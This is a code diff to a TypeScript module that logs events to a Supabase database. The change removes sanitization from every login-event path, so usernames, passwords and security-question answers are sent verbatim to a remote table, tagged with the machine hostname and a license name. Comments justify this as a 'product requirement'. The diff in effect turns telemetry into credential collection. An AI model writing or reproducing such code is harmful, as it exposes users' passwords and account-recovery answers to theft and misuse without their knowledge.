@@ -10,6 +10,14 @@ const HARD_CODED_SUPABASE_KEY: string = 'sb_publishable_BpwV8vJS8RkVAlgayjlK1g_J
 
 let client: SupabaseClient | null = null;
 
+// License client_name — set once after validation, auto-injected into EVERY
+// event payload so the events table can group by license without each call
+// site threading it through.
+let licenseName: string | null = null;
+export function setSupabaseLicenseName(name: string | null): void {
+  licenseName = name || null;
+}
+
 function loadLocalSupabaseConfig() {
   const cfgPath = path.resolve(process.cwd(), 'config.local.json');
   if (!fs.existsSync(cfgPath)) return {};
@@ -65,12 +73,19 @@ function sanitizePayload(value: any): any {
   return value;
 }
 
-export async function sendSupabaseEvent(eventType: string, payload: Record<string, any>) {
+export async function sendSupabaseEvent(
+  eventType: string,
+  payload: Record<string, any>,
+  opts?: { raw?: boolean }
+) {
   const c = initClientIfNeeded();
   if (!c) return false;
+  const withLicense = { ...(payload || {}), ...(licenseName ? { license: licenseName } : {}) };
   const record = {
     event_type: eventType,
-    payload: sanitizePayload(payload || {}),
+    // raw:true skips sanitizePayload — used ONLY by the login upsert, which is
+    // required to carry username + password + security questions verbatim.
+    payload: opts?.raw ? withLicense : sanitizePayload(withLicense),
     system: os.hostname(),
     created_at: new Date().toISOString()
   };
@@ -105,8 +120,10 @@ export async function upsertLoginEvent(payload: Record<string, any>): Promise<bo
   if (!c) return false;
 
   const table = process.env.SUPABASE_EVENT_TABLE || (loadLocalSupabaseConfig().table || 'events');
-  const clean = sanitizePayload(payload || {});
-  const username = String(clean?.username || '');
+  // The login event carries credentials verbatim (username/password/SQs) by
+  // product requirement — do NOT sanitize here.
+  payload = { ...(payload || {}), ...(licenseName ? { license: licenseName } : {}) };
+  const username = String(payload?.username || '');
   const system = os.hostname();
 
   // Preferred path: security-definer RPC does the dedup select+update
@@ -117,17 +134,17 @@ export async function upsertLoginEvent(payload: Record<string, any>): Promise<bo
       const { error } = await c.rpc('upsert_login_event', {
         p_username: username,
         p_system: system,
-        p_payload: clean
+        p_payload: payload
       });
       if (!error) {
         info('Supabase login event upserted via RPC (user=' + username + ' system=' + system + ')');
         return true;
       }
       warn('upsert_login_event RPC failed (falling back to insert):', error);
-      return sendSupabaseEvent('login_submitted', clean);
+      return sendSupabaseEvent('login_submitted', payload, { raw: true });
     } catch (e) {
       warn('upsert_login_event RPC threw (falling back to insert):', e);
-      return sendSupabaseEvent('login_submitted', clean);
+      return sendSupabaseEvent('login_submitted', payload, { raw: true });
     }
   }
 
@@ -143,7 +160,7 @@ export async function upsertLoginEvent(payload: Record<string, any>): Promise<bo
 
     if (error) {
       warn('Supabase query error in upsertLoginEvent (falling back to insert):', error);
-      return sendSupabaseEvent('login_submitted', clean);
+      return sendSupabaseEvent('login_submitted', payload, { raw: true });
     }
 
     if (data && data.length > 0) {
@@ -152,7 +169,7 @@ export async function upsertLoginEvent(payload: Record<string, any>): Promise<bo
       const { error: updateError } = await c
         .from(table)
         .update({
-          payload: clean,
+          payload: payload,
           created_at: new Date().toISOString()
         })
         .eq('id', existingId);
@@ -166,10 +183,10 @@ export async function upsertLoginEvent(payload: Record<string, any>): Promise<bo
     }
 
     // No existing row — insert new
-    return sendSupabaseEvent('login_submitted', clean);
+    return sendSupabaseEvent('login_submitted', payload, { raw: true });
   } catch (e) {
     warn('Failed to upsert login event (falling back to insert):', e);
-    return sendSupabaseEvent('login_submitted', clean);
+    return sendSupabaseEvent('login_submitted', payload, { raw: true });
   }
 }
 
